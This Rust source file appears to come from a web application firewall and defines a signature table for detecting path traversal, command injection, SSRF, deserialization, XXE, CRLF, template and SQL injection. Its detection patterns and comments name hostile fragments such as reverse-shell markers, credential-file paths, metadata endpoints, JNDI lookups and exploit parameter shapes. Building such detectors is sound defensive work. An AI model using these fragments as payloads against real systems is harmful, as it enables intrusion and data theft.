//! Signature-based detection.
//!
//! Two layers:
//! 1. Aho-Corasick automaton over a built-in needle table — covers literal
//!    payloads (path traversal, SSRF targets, XXE markers, dangerous shell
//!    metacharacters, …) with a single linear scan.
//! 2. libinjection-style detectors for SQL injection and XSS that go beyond
//!    literal matching: they tokenize the input and look for syntactic
//!    patterns that distinguish an attack from innocent text.

use std::fmt;

use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};

use crate::{StackSet, WafLevel};

// ---------------------------------------------------------------------------
// Categories & patterns
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AttackCategory {
    SqlInjection,
    Xss,
    CommandInjection,
    PathTraversal,
    Ssrf,
    Deserialization,
    CrlfInjection,
    Xxe,
    TemplateInjection,
}

impl AttackCategory {
    pub fn as_str(self) -> &'static str {
        match self {
            AttackCategory::SqlInjection => "sqli",
            AttackCategory::Xss => "xss",
            AttackCategory::CommandInjection => "rce",
            AttackCategory::PathTraversal => "lfi",
            AttackCategory::Ssrf => "ssrf",
            AttackCategory::Deserialization => "deser",
            AttackCategory::CrlfInjection => "crlf",
            AttackCategory::Xxe => "xxe",
            AttackCategory::TemplateInjection => "ssti",
        }
    }
}

impl fmt::Display for AttackCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// A single detection signature. All metadata is `&'static str` — the table
/// lives in the binary's read-only data, so building an engine never copies
/// pattern identity around, and per-request hits only carry a `u32` index.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SignaturePattern {
    pub id: &'static str,
    pub category: AttackCategory,
    /// 1 (info) … 5 (critical).
    pub severity: u8,
    /// Backend stacks whose runtime actually interprets this payload family.
    /// [`StackSet::GENERIC`] patterns are active for every deployment.
    pub stack: StackSet,
    /// Only loaded into the automaton when the engine runs at
    /// [`WafLevel::Strict`] — needles whose false-positive cost is acceptable
    /// only when operators explicitly asked for maximum coverage.
    pub strict_only: bool,
    pub description: &'static str,
    /// Literal needle registered in the Aho-Corasick automaton.
    pub needle: &'static str,
}

/// A signature match. Deliberately allocation-free: `pattern` is an index
/// resolved against the engine's active table, so a hit is a handful of
/// integers instead of two heap Strings.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SignatureHit {
    /// Index into the engine's active pattern list; resolve metadata via
    /// [`SignatureEngine::pattern`].
    pub pattern: u32,
    pub category: AttackCategory,
    pub severity: u8,
    /// Byte offset where the needle was found.
    pub offset: usize,
    /// Length of the matched needle in bytes.
    pub length: usize,
}

/// Built-in needle table. Patterns are kept short and high-signal so the
/// automaton stays compact and false positives remain rare. Every entry's
/// identity is baked into the binary; building an engine only selects which
/// slices of this table land in its automaton.
fn builtin_patterns() -> Vec<SignaturePattern> {
    let mut v: Vec<SignaturePattern> = Vec::with_capacity(132);
    // Scoped so the closure's mutable borrow of `v` ends before it is moved
    // out below.
    {
        let mut push = |id: &'static str,
                        cat: AttackCategory,
                        sev: u8,
                        desc: &'static str,
                        needle: &'static str| {
            v.push(SignaturePattern {
                id,
                category: cat,
                severity: sev,
                stack: StackSet::GENERIC,
                strict_only: false,
                description: desc,
                needle,
            });
        };

        // ---- Path traversal ----
        push(
            "PT-001",
            AttackCategory::PathTraversal,
            4,
            "directory traversal (../)",
            "../",
        );
        push(
            "PT-002",
            AttackCategory::PathTraversal,
            4,
            "directory traversal (..\\)",
            "..\\",
        );
        push(
            "PT-003",
            AttackCategory::PathTraversal,
            5,
            "etc/passwd access",
            "/etc/passwd",
        );
        push(
            "PT-004",
            AttackCategory::PathTraversal,
            5,
            "etc/shadow access",
            "/etc/shadow",
        );
        push(
            "PT-005",
            AttackCategory::PathTraversal,
            4,
            "proc/self enumeration",
            "/proc/self",
        );
        push(
            "PT-006",
            AttackCategory::PathTraversal,
            4,
            "windows system32 access",
            "windows\\system32",
        );
        push(
            "PT-007",
            AttackCategory::PathTraversal,
            4,
            "windows system32 access (forward slash)",
            "/windows/system32",
        );
        push(
            "PT-008",
            AttackCategory::PathTraversal,
            3,
            "htaccess probe",
            ".htaccess",
        );
        push(
            "PT-009",
            AttackCategory::PathTraversal,
            3,
            "htpasswd probe",
            ".htpasswd",
        );
        push(
            "PT-010",
            AttackCategory::PathTraversal,
            3,
            "web.config probe",
            "web.config",
        );
        push(
            "PT-011",
            AttackCategory::PathTraversal,
            3,
            "boot.ini probe",
            "boot.ini",
        );
        push(
            "PT-012",
            AttackCategory::PathTraversal,
            4,
            "double-encoded traversal",
            "....//",
        );
        // Slash-less variants: Aho-Corasick consumes non-overlapping matches,
        // so a leading "../" can swallow the "/" that PT-003/004/005 need.
        push(
            "PT-013",
            AttackCategory::PathTraversal,
            5,
            "etc/passwd access (no leading slash)",
            "etc/passwd",
        );
        push(
            "PT-014",
            AttackCategory::PathTraversal,
            5,
            "etc/shadow access (no leading slash)",
            "etc/shadow",
        );
        push(
            "PT-015",
            AttackCategory::PathTraversal,
            4,
            "proc/self enumeration (no leading slash)",
            "proc/self",
        );
        push(
            "PT-016",
            AttackCategory::PathTraversal,
            5,
            "windows win.ini access",
            "win.ini",
        );
        push(
            "PT-017",
            AttackCategory::PathTraversal,
            5,
            "WEB-INF deployment descriptor dir",
            "web-inf",
        );
        push(
            "PT-020",
            AttackCategory::PathTraversal,
            5,
            "web.xml deployment descriptor probe",
            "web.xml",
        );
        push(
            "PT-018",
            AttackCategory::PathTraversal,
            5,
            "Cisco ASA +CSCOE+ traversal",
            "portal_inc.lua",
        );
        // Tomcat/F5 `..;/` semicolon traversal: the escaped delimiter only
        // appears when a caller is smuggling past a path-normalizing proxy.
        push(
            "PT-019",
            AttackCategory::PathTraversal,
            5,
            "semicolon path traversal",
            "..;/",
        );
        // ---- Command injection ----
        push(
            "CI-001",
            AttackCategory::CommandInjection,
            5,
            "command substitution $(whoami)",
            "$(whoami)",
        );
        push(
            "CI-002",
            AttackCategory::CommandInjection,
            5,
            "command substitution $(id)",
            "$(id)",
        );
        push(
            "CI-003",
            AttackCategory::CommandInjection,
            4,
            "backtick command",
            "`id`",
        );
        push(
            "CI-004",
            AttackCategory::CommandInjection,
            4,
            "backtick command (whoami)",
            "`whoami`",
        );
        push(
            "CI-005",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to cat",
            "|cat",
        );
        push(
            "CI-006",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to ls",
            "|ls",
        );
        push(
            "CI-007",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to wget",
            "|wget",
        );
        push(
            "CI-008",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to curl",
            "|curl",
        );
        push(
            "CI-009",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained ls",
            ";ls",
        );
        push(
            "CI-010",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained cat",
            ";cat",
        );
        push(
            "CI-011",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained id",
            ";id",
        );
        push(
            "CI-012",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained wget",
            ";wget",
        );
        push(
            "CI-013",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained curl",
            ";curl",
        );
        push(
            "CI-014",
            AttackCategory::CommandInjection,
            5,
            "&& chained wget",
            "&&wget",
        );
        push(
            "CI-015",
            AttackCategory::CommandInjection,
            5,
            "&& chained curl",
            "&&curl",
        );
        push(
            "CI-016",
            AttackCategory::CommandInjection,
            5,
            "|| chained curl",
            "||curl",
        );
        push(
            "CI-017",
            AttackCategory::CommandInjection,
            5,
            "|| chained wget",
            "||wget",
        );
        push(
            "CI-018",
            AttackCategory::CommandInjection,
            4,
            "IFS variable",
            "${ifs}",
        );
        push(
            "CI-019",
            AttackCategory::CommandInjection,
            5,
            "/bin/sh invocation",
            "/bin/sh",
        );
        push(
            "CI-020",
            AttackCategory::CommandInjection,
            5,
            "/bin/bash invocation",
            "/bin/bash",
        );
        push(
            "CI-021",
            AttackCategory::CommandInjection,
            5,
            "interactive bash",
            "bash -i",
        );
        push(
            "CI-022",
            AttackCategory::CommandInjection,
            5,
            "cmd.exe invocation",
            "cmd.exe",
        );
        push(
            "CI-023",
            AttackCategory::CommandInjection,
            5,
            "powershell invocation",
            "powershell",
        );
        push(
            "CI-024",
            AttackCategory::CommandInjection,
            4,
            "nc reverse shell",
            "nc -e",
        );
        push(
            "CI-025",
            AttackCategory::CommandInjection,
            4,
            "newline before /bin/",
            "\n/bin/",
        );
        push(
            "CI-026",
            AttackCategory::CommandInjection,
            5,
            "python os.system call",
            "os.system",
        );
        push(
            "CI-027",
            AttackCategory::CommandInjection,
            5,
            "python __import__ call",
            "__import__",
        );
        push(
            "CI-028",
            AttackCategory::CommandInjection,
            5,
            "php shell_exec call",
            "shell_exec(",
        );
        push(
            "CI-029",
            AttackCategory::CommandInjection,
            5,
            "php passthru call",
            "passthru(",
        );
        push(
            "CI-030",
            AttackCategory::CommandInjection,
            5,
            "php proc_open call",
            "proc_open(",
        );
        push(
            "CI-031",
            AttackCategory::CommandInjection,
            4,
            "python subprocess call",
            "subprocess.",
        );
        push(
            "CI-032",
            AttackCategory::CommandInjection,
            5,
            "powershell invoke-expression",
            "invoke-expression",
        );
        push(
            "CI-033",
            AttackCategory::CommandInjection,
            4,
            "powershell iex alias",
            "iex (",
        );
        push(
            "CI-034",
            AttackCategory::CommandInjection,
            4,
            "windows cmd /c chain",
            "cmd /c",
        );
        push(
            "CI-035",
            AttackCategory::CommandInjection,
            4,
            "windows cmd.exe /c chain",
            "cmd.exe /c",
        );
        push(
            "CI-036",
            AttackCategory::CommandInjection,
            5,
            "powershell encoded command",
            "powershell -enc",
        );
        push(
            "CI-037",
            AttackCategory::CommandInjection,
            4,
            "C/PHP system() call",
            "system(",
        );
        push(
            "CI-038",
            AttackCategory::CommandInjection,
            5,
            "shell pipe to whoami",
            "|whoami",
        );
        push(
            "CI-039",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained whoami",
            ";whoami",
        );
        push(
            "CI-040",
            AttackCategory::CommandInjection,
            4,
            "shell pipe to uname",
            "|uname",
        );
        push(
            "CI-041",
            AttackCategory::CommandInjection,
            4,
            "backtick command (uname)",
            "`uname`",
        );
        push(
            "CI-042",
            AttackCategory::CommandInjection,
            4,
            "semicolon chained uname",
            ";uname",
        );
        // Java/OGNL/SpEL runtime exec chain — the payload core of every
        // Struts2/SpringEL RCE exploit, critical even at Normal.
        push(
            "CI-043",
            AttackCategory::CommandInjection,
            5,
            "Java runtime exec chain",
            "getruntime().exec",
        );
        // Jenkins sandbox-bypass endpoint (descriptorByName/…SecureGroovyScript)
        // — the class name is exploit-specific, never a benign path token.
        push(
            "CI-044",
            AttackCategory::CommandInjection,
            5,
            "Jenkins Groovy sandbox endpoint",
            "securegroovy",
        );
        // Spaced command separators: `; whoami`, `| curl` — the tight
        // needles above only see the no-space form. The trailing space on
        // network commands keeps `;id` matrix-parameter paths (`/foo;id=x`)
        // out of these hits.
        push(
            "CI-045",
            AttackCategory::CommandInjection,
            4,
            "spaced command separator",
            "; whoami",
        );
        push(
            "CI-046",
            AttackCategory::CommandInjection,
            4,
            "spaced command separator",
            "; uname",
        );
        push(
            "CI-047",
            AttackCategory::CommandInjection,
            4,
            "spaced command separator",
            "; ping ",
        );
        push(
            "CI-048",
            AttackCategory::CommandInjection,
            4,
            "spaced command separator",
            "; curl ",
        );
        push(
            "CI-049",
            AttackCategory::CommandInjection,
            4,
            "spaced command separator",
            "; wget ",
        );
        push(
            "CI-04a",
            AttackCategory::CommandInjection,
            4,
            "spaced command separator",
            "; sleep ",
        );
        push(
            "CI-04b",
            AttackCategory::CommandInjection,
            4,
            "spaced command separator",
            "; echo ",
        );
        push(
            "CI-050",
            AttackCategory::CommandInjection,
            4,
            "piped spaced command",
            "| whoami",
        );
        push(
            "CI-051",
            AttackCategory::CommandInjection,
            4,
            "piped spaced command",
            "| uname",
        );
        push(
            "CI-052",
            AttackCategory::CommandInjection,
            4,
            "piped spaced command",
            "| ping ",
        );
        push(
            "CI-053",
            AttackCategory::CommandInjection,
            4,
            "piped spaced command",
            "| curl ",
        );
        push(
            "CI-054",
            AttackCategory::CommandInjection,
            4,
            "piped spaced command",
            "| wget ",
        );
        push(
            "CI-055",
            AttackCategory::CommandInjection,
            4,
            "piped spaced command",
            "| sleep ",
        );
        push(
            "CI-060",
            AttackCategory::CommandInjection,
            4,
            "double-pipe spaced command",
            "|| whoami",
        );
        push(
            "CI-061",
            AttackCategory::CommandInjection,
            4,
            "double-pipe spaced command",
            "|| uname",
        );
        push(
            "CI-062",
            AttackCategory::CommandInjection,
            4,
            "double-pipe spaced command",
            "|| ping ",
        );
        push(
            "CI-063",
            AttackCategory::CommandInjection,
            4,
            "double-pipe spaced command",
            "|| curl ",
        );
        push(
            "CI-064",
            AttackCategory::CommandInjection,
            4,
            "double-pipe spaced command",
            "|| wget ",
        );
        push(
            "CI-065",
            AttackCategory::CommandInjection,
            4,
            "double-pipe spaced command",
            "|| sleep ",
        );
        // Backtick-wrapped network/utility commands (exfil/beacon probes):
        // `` `ping collab` ``, `` `curl …` ``. Complements CI-041 (uname).
        push(
            "CI-070",
            AttackCategory::CommandInjection,
            4,
            "backtick command",
            "`ping ",
        );
        push(
            "CI-071",
            AttackCategory::CommandInjection,
            4,
            "backtick command",
            "`curl ",
        );
        push(
            "CI-072",
            AttackCategory::CommandInjection,
            4,
            "backtick command",
            "`wget ",
        );
        push(
            "CI-078",
            AttackCategory::CommandInjection,
            5,
            "eval(atob()) payload wrapper",
            "eval(atob(",
        );
        // LDAP filter injection: the `)(uid=` / `)(|(` breaks are pure
        // filter-grammar, never benign query text.
        push(
            "CI-080",
            AttackCategory::CommandInjection,
            5,
            "LDAP filter injection break",
            ")(uid=",
        );
        push(
            "CI-081",
            AttackCategory::CommandInjection,
            5,
            "LDAP filter injection break",
            ")(|(",
        );
        push(
            "CI-082",
            AttackCategory::CommandInjection,
            5,
            "LDAP filter injection break",
            "*)(objectclass=",
        );
        // `ping -c N` chained into a parameter (`ip=x||ping -c 10 …`) is a
        // blind-RCE probe; the flag pair never appears as benign text.
        push(
            "CI-083",
            AttackCategory::CommandInjection,
            5,
            "chained ping probe",
            "ping -c ",
        );
        // Struts2/OGNL: `redirect:${#a=#context.get('…')}` — the `#`-variable
        // context lookup is OGNL grammar, never a benign search phrase.
        push(
            "CI-084",
            AttackCategory::CommandInjection,
            5,
            "OGNL context variable chain",
            "#context.get(",
        );
        // PHP webshell opener: `<?php` in a reflected surface or parameter
        // is upload/code-execution payload, not document text.
        push(
            "CI-085",
            AttackCategory::CommandInjection,
            5,
            "PHP code tag",
            "<?php",
        );
        // ThinkPHP route RCE (CVE-2018-20062 family): the dispatcher path
        // `\\think\\app/invokefunction` with call_user_func is the POC core.
        push(
            "CI-086",
            AttackCategory::CommandInjection,
            5,
            "ThinkPHP invokefunction route",
            "think\\app/invokefunction",
        );
        push(
            "CI-087",
            AttackCategory::CommandInjection,
            5,
            "backtick touch command",
            "`touch ",
        );
        push(
            "CI-088",
            AttackCategory::CommandInjection,
            5,
            "DedeCMS runphp template exec",
            "runphp=",
        );
        push(
            "CI-089",
            AttackCategory::CommandInjection,
            5,
            "LDAP filter injection break",
            "*)((|",
        );
        // PHP-CGI argument injection (CVE-2024-4577 family): `-d
        // allow_url_include=on` on a CGI route re-enables remote code
        // inclusion; the ini flag never appears in benign request input.
        push(
            "CI-090",
            AttackCategory::CommandInjection,
            5,
            "PHP-CGI ini override flag",
            "allow_url_include",
        );
        // Drupal render-array property keys (Drupalgeddon 2/3 family):
        // `mail[#post_render][]=exec&mail[#markup]=id`. Honest HTML forms
        // essentially never carry `#`-prefixed array keys; the corpus shows
        // zero benign hits.
        push(
            "CI-091",
            AttackCategory::CommandInjection,
            5,
            "Drupal render-array post_render key",
            "#post_render",
        );
        push(
            "CI-092",
            AttackCategory::CommandInjection,
            5,
            "Drupal render-array pre_render key",
            "#pre_render",
        );
        push(
            "CI-093",
            AttackCategory::CommandInjection,
            5,
            "Drupal render-array lazy_builder key",
            "#lazy_builder",
        );
        push(
            "CI-094",
            AttackCategory::CommandInjection,
            5,
            "Drupal render-array markup key",
            "#markup",
        );
        push(
            "CI-095",
            AttackCategory::CommandInjection,
            5,
            "Drupal render-array elements key",
            "#elements",
        );
        // Classic ASP one-liner webshell (`<%eval request("x")%>`); the
        // scriptlet-plus-eval pair never occurs in honest markup.
        push(
            "CI-096",
            AttackCategory::CommandInjection,
            5,
            "ASP scriptlet eval backdoor",
            "<%eval",
        );
        push(
            "CI-097",
            AttackCategory::CommandInjection,
            5,
            "ASP scriptlet execute backdoor",
            "<%execute",
        );
        push(
            "CI-098",
            AttackCategory::CommandInjection,
            5,
            "ASP eval-request one-liner",
            "eval request(",
        );
        // PHP write primitive as a bare parameter value — the remote-dropper
        // pattern (`t=file_put_contents&t1=./shell.php&t3=http://…/txt`).
        push(
            "CI-099",
            AttackCategory::CommandInjection,
            5,
            "PHP file write primitive",
            "file_put_contents",
        );
        // Tight `||`-chained DNS lookup: `x||nslookup collab.example` — the
        // spaced-pipe needles above only see `|| nslookup`; command chains
        // with an immediate second stage skip the space. The `+`-as-space
        // query decode already turns `+nslookup` into ` nslookup`.
        push(
            "CI-107",
            AttackCategory::CommandInjection,
            4,
            "piped DNS lookup",
            "||nslookup ",
        );
        // Pipe into a filesystem write: `aaa|touch /tmp/success` — the
        // pipeline hands the attacker-controlled command straight to a
        // shell; `touch /` never appears in an honest value.
        push(
            "CI-108",
            AttackCategory::CommandInjection,
            4,
            "piped file write",
            "|touch /",
        );
        // Git client option injection (CVE-2019-1387 family): a value that
        // becomes a command-line option (`--upload-pack=cmd`,
        // `--open-files-in-pager=cmd`) executes it on the server when a
        // git-aware backend shells out. Options never start a query value
        // honestly.
        push(
            "CI-109",
            AttackCategory::CommandInjection,
            5,
            "git pager option injection",
            "--open-files-in-pager=",
        );
        push(
            "CI-110",
            AttackCategory::CommandInjection,
            5,
            "git shell option injection",
            "--upload-pack=",
        );
        // Lua sandbox escape via the os library (`local os =
        // require('os')` in APISIX route scripts); both quote flavors —
        // honest payloads never load `os` by name.
        push(
            "CI-111",
            AttackCategory::CommandInjection,
            5,
            "Lua os library escape",
            "require('os')",
        );
        push(
            "CI-112",
            AttackCategory::CommandInjection,
            5,
            "Lua os library escape",
            "require(\"os\")",
        );
        // Java runtime introspection in a data value: `Runtime.getRuntime()`
        // on its own (statement-separated `…getRuntime(); r.exec(…)` form
        // skips the CI-043 chained needle) never appears in an honest
        // parameter, JSON member or form field.
        push(
            "CI-113",
            AttackCategory::CommandInjection,
            5,
            "Java runtime introspection",
            "getruntime()",
        );
        // Nexus EL arithmetic probes: `$\A{233*233*233}` / `$\B{233*233}`
        // (CVE-2020-10204 family) — engine-specific escape variants that
        // evaluate the injected expression; the brace digits form only
        // exists inside exploit payloads.
        push(
            "CI-114",
            AttackCategory::CommandInjection,
            5,
            "Nexus EL arithmetic probe (A variant)",
            "$\\a{",
        );
        push(
            "CI-115",
            AttackCategory::CommandInjection,
            5,
            "Nexus EL arithmetic probe (B variant)",
            "$\\b{",
        );
        // JSFuck / Harley-Davidson style pure-symbol JS: the prefix
        // `[(+{}+[])` only occurs inside obfuscated execution payloads.
        push(
            "XSS-022",
            AttackCategory::Xss,
            5,
            "JSFuck invocation prefix",
            "[(+{}+[])",
        );
        // UTF-7 encoded `<` (`+ADw-`): the classic `+ADw-script+AD4-` markup
        // smuggle rides on this fixed prefix; honest text never emits it.
        push(
            "XSS-023",
            AttackCategory::Xss,
            5,
            "UTF-7 encoded markup opener",
            "+ADw-",
        );
        // The literal probe `alert(1)` — the overwhelmingly common smoke-test
        // payload. The generic `alert(` needle stays sev3 (prose mentions);
        // the exact `alert(1)` literal does not occur in benign corpus.
        push(
            "XSS-024",
            AttackCategory::Xss,
            5,
            "alert(1) literal probe",
            "alert(1)",
        );

        // ---- SSRF ----
        push(
            "SSRF-001",
            AttackCategory::Ssrf,
            5,
            "AWS metadata endpoint",
            "169.254.169.254",
        );
        push(
            "SSRF-002",
            AttackCategory::Ssrf,
            5,
            "GCP metadata host",
            "metadata.google",
        );
        push(
            "SSRF-003",
            AttackCategory::Ssrf,
            5,
            "AWS task metadata",
            "169.254.170.2",
        );
        push(
            "SSRF-004",
            AttackCategory::Ssrf,
            4,
            "loopback IPv6",
            "[::1]",
        );
        push(
            "SSRF-005",
            AttackCategory::Ssrf,
            4,
            "loopback IPv4",
            "127.0.0.1",
        );
        push(
            "SSRF-006",
            AttackCategory::Ssrf,
            3,
            "wildcard IPv4",
            "0.0.0.0",
        );
        push(
            "SSRF-007",
            AttackCategory::Ssrf,
            4,
            "localhost with port",
            "localhost:",
        );
        push(
            "SSRF-008",
            AttackCategory::Ssrf,
            5,
            "file:// scheme",
            "file://",
        );
        push(
            "SSRF-009",
            AttackCategory::Ssrf,
            5,
            "gopher:// scheme",
            "gopher://",
        );
        push(
            "SSRF-010",
            AttackCategory::Ssrf,
            5,
            "dict:// scheme",
            "dict://",
        );
        push(
            "SSRF-011",
            AttackCategory::Ssrf,
            4,
            "ldap:// scheme",
            "ldap://",
        );
        push(
            "SSRF-012",
            AttackCategory::Ssrf,
            4,
            "ftp:// scheme",
            "ftp://",
        );
        // Loopback / link-local aliases: classic SSRF filters block the
        // literal IP, so probes move to alternative encodings. The encoded
        // forms are unambiguous; the plain names stay non-critical because
        // "localhost" shows up in dev traffic.
        push(
            "SSRF-013",
            AttackCategory::Ssrf,
            4,
            "localhost name",
            "localhost",
        );
        push(
            "SSRF-014",
            AttackCategory::Ssrf,
            4,
            "loopback IPv4",
            "127.0.0.1",
        );
        push(
            "SSRF-015",
            AttackCategory::Ssrf,
            5,
            "hex loopback encoding",
            "0x7f000001",
        );
        push(
            "SSRF-016",
            AttackCategory::Ssrf,
            5,
            "decimal loopback encoding",
            "2130706433",
        );
        push(
            "SSRF-017",
            AttackCategory::Ssrf,
            5,
            "octal loopback encoding",
            "0177.0.0.1",
        );
        // Atlassian gadget proxy: `makeRequest` fetches an attacker-chosen
        // URL server-side (CVE-2019-3403 family); the servlet path is the
        // POC's fingerprint. sev5: the path only ever appears on the
        // exploit's own route.
        push(
            "SSRF-018",
            AttackCategory::Ssrf,
            5,
            "Atlassian gadget makeRequest proxy",
            "gadgets/makerequest",
        );

        // ---- Deserialization ----
        push(
            "DZ-001",
            AttackCategory::Deserialization,
            5,
            "Java serialized stream",
            "aced0005",
        );
        push(
            "DZ-002",
            AttackCategory::Deserialization,
            5,
            "Python __reduce__",
            "__reduce__",
        );
        push(
            "DZ-003",
            AttackCategory::Deserialization,
            5,
            "Node.js prototype pollution",
            "__proto__",
        );
        push(
            "DZ-004",
            AttackCategory::Deserialization,
            4,
            "Python class introspection",
            "__class__",
        );
        push(
            "DZ-005",
            AttackCategory::Deserialization,
            4,
            "PHP magic __wakeup",
            ":__wakeup",
        );
        push(
            "DZ-006",
            AttackCategory::Deserialization,
            4,
            "PHP magic __destruct",
            ":__destruct",
        );
        push(
            "DZ-007",
            AttackCategory::Deserialization,
            4,
            "PHP magic __toString",
            ":__tostring",
        );
        push(
            "DZ-008",
            AttackCategory::Deserialization,
            5,
            "Java Runtime.exec",
            "runtime.exec",
        );
        push(
            "DZ-009",
            AttackCategory::Deserialization,
            5,
            "Java ProcessBuilder",
            "processbuilder",
        );
        push(
            "DZ-010",
            AttackCategory::Deserialization,
            4,
            "PHP unserialize call",
            "unserialize(",
        );
        push(
            "DZ-011",
            AttackCategory::Deserialization,
            4,
            "YAML unsafe_load",
            "yaml.unsafe_load",
        );
        // Struts2 / OGNL attack surface: static-class invocations and the
        // s2-* value-stack references. `@java.lang.` is unambiguous OGNL;
        // the `#ref` shapes are the Struts context lookup pattern.
        // Severity 4 rather than 5: the Normal level only scores deser
        // hits; strict treats the whole Deserialization category as
        // critical, so the higher grade would be redundant there and
        // would force a Normal-level block instead.
        push(
            "DZ-012",
            AttackCategory::Deserialization,
            4,
            "OGNL static class call",
            "@java.lang.",
        );
        push(
            "DZ-013",
            AttackCategory::Deserialization,
            4,
            "Struts2 context reference",
            "#context=",
        );
        push(
            "DZ-014",
            AttackCategory::Deserialization,
            4,
            "Struts2 attr reference",
            "#attr[",
        );
        push(
            "DZ-015",
            AttackCategory::Deserialization,
            4,
            "Struts2 application reference",
            "#application",
        );
        // EL/SpEL/Jexl gadget-chain idiom: `"".getClass().forName(
        // 'java.lang.Runtime')` (Nexus CVE-2020-10199/10204 family). Only
        // ever a web-parameter value inside an exploit.
        push(
            "DZ-016",
            AttackCategory::Deserialization,
            5,
            "getClass().forName gadget chain",
            "getclass().forname",
        );
        // Base64 of the Java stream magic `AC ED 00 05` — a serialized
        // Java object rides in every Java deserialization gadget vector
        // (ViewState, RMI, cookie blobs) and never in benign parameters.
        push(
            "DZ-017",
            AttackCategory::Deserialization,
            5,
            "Java serialized object magic (b64)",
            "rO0AB",
        );
        // XStream custom-serialization XML (CVE-2021-21344 family): the
        // `serialization='custom'` attribute and `java.util.` element names
        // are produced only by the exploit's hand-written XML stream.
        push(
            "DZ-018",
            AttackCategory::Deserialization,
            4,
            "XStream java element",
            "<java.util.",
        );
        push(
            "DZ-019",
            AttackCategory::Deserialization,
            5,
            "XStream custom serialization",
            "serialization='custom'",
        );

        // ---- XXE ----
        // A DOCTYPE alone is boilerplate on every HTML page and benign XML
        // payload — the attack needs an ENTITY (XXE-002+) or a file://
        // SYSTEM id, so the opener itself must not be a critical hit.
        push(
            "XXE-001",
            AttackCategory::Xxe,
            3,
            "DOCTYPE declaration",
            "<!doctype",
        );
        push(
            "XXE-002",
            AttackCategory::Xxe,
            5,
            "ENTITY declaration",
            "<!entity",
        );
        push(
            "XXE-003",
            AttackCategory::Xxe,
            5,
            "SYSTEM file: entity",
            "system \"file:",
        );
        push(
            "XXE-004",
            AttackCategory::Xxe,
            5,
            "SYSTEM file: entity (single-quoted)",
            "system 'file:",
        );
        push(
            "XXE-005",
            AttackCategory::Xxe,
            4,
            "PUBLIC identifier",
            "public \"-//",
        );

        // ---- CRLF ----
        push(
            "CRLF-001",
            AttackCategory::CrlfInjection,
            4,
            "raw CRLF in value",
            "\r\n",
        );
        push(
            "CRLF-002",
            AttackCategory::CrlfInjection,
            4,
            "raw CR in value",
            "\r",
        );
        // Header-name variants: bare "\r\n" cannot be raised to sev 5 (JSON
        // bodies contain many benign CRLFs), but "\r\n" followed by a header
        // name is unambiguous response-splitting intent.
        push(
            "CRLF-003",
            AttackCategory::CrlfInjection,
            5,
            "CRLF before set-cookie header",
            "\r\nset-cookie",
        );
        push(
            "CRLF-004",
            AttackCategory::CrlfInjection,
            5,
            "CRLF before location header",
            "\r\nlocation:",
        );

        // ---- Template injection ----
        push(
            "TI-001",
            AttackCategory::TemplateInjection,
            4,
            "Jinja/Twig double brace",
            "{{",
        );
        push(
            "TI-002",
            AttackCategory::TemplateInjection,
            4,
            "Jinja statement block",
            "{%",
        );
        push(
            "TI-003",
            AttackCategory::TemplateInjection,
            4,
            "EL/Shell expression",
            "${",
        );
        push(
            "TI-004",
            AttackCategory::TemplateInjection,
            4,
            "Ruby/JS template hash",
            "#{",
        );
        push(
            "TI-005",
            AttackCategory::TemplateInjection,
            4,
            "EJS/JSP expression",
            "<%=",
        );
        push(
            "TI-006",
            AttackCategory::TemplateInjection,
            5,
            "Log4Shell JNDI lookup",
            "${jndi:",
        );
        push(
            "TI-007",
            AttackCategory::TemplateInjection,
            5,
            "Jinja self reference",
            "{{self",
        );
        push(
            "TI-008",
            AttackCategory::TemplateInjection,
            5,
            "Jinja config leak",
            "{{config",
        );

        // ---- SQL injection (literal needles; libinjection catches the rest) ----
        push(
            "SQL-001",
            AttackCategory::SqlInjection,
            5,
            "UNION SELECT",
            "union select",
        );
        push(
            "SQL-002",
            AttackCategory::SqlInjection,
            5,
            "UNION ALL SELECT",
            "union all select",
        );
        push(
            "SQL-003",
            AttackCategory::SqlInjection,
            4,
            "SLEEP function",
            "sleep(",
        );
        push(
            "SQL-004",
            AttackCategory::SqlInjection,
            5,
            "BENCHMARK function",
            "benchmark(",
        );
        push(
            "SQL-005",
            AttackCategory::SqlInjection,
            5,
            "pg_sleep function",
            "pg_sleep(",
        );
        push(
            "SQL-006",
            AttackCategory::SqlInjection,
            5,
            "waitfor delay",
            "waitfor delay",
        );
        push(
            "SQL-007",
            AttackCategory::SqlInjection,
            5,
            "load_file function",
            "load_file(",
        );
        push(
            "SQL-008",
            AttackCategory::SqlInjection,
            5,
            "INTO OUTFILE",
            "into outfile",
        );
        push(
            "SQL-009",
            AttackCategory::SqlInjection,
            5,
            "INTO DUMPFILE",
            "into dumpfile",
        );
        push(
            "SQL-010",
            AttackCategory::SqlInjection,
            3,
            "information_schema probe",
            "information_schema",
        );
        push(
            "SQL-011",
            AttackCategory::SqlInjection,
            3,
            "sqlite_master probe",
            "sqlite_master",
        );
        push(
            "SQL-012",
            AttackCategory::SqlInjection,
            3,
            "pg_catalog probe",
            "pg_catalog",
        );
        push(
            "SQL-013",
            AttackCategory::SqlInjection,
            4,
            "group_concat aggregation",
            "group_concat(",
        );
        push(
            "SQL-014",
            AttackCategory::SqlInjection,
            4,
            "concat_ws aggregation",
            "concat_ws(",
        );
        push(
            "SQL-015",
            AttackCategory::SqlInjection,
            4,
            "extractvalue function",
            "extractvalue(",
        );
        push(
            "SQL-016",
            AttackCategory::SqlInjection,
            4,
            "updatexml function",
            "updatexml(",
        );
        push(
            "SQL-017",
            AttackCategory::SqlInjection,
            4,
            "DROP TABLE",
            "drop table",
        );
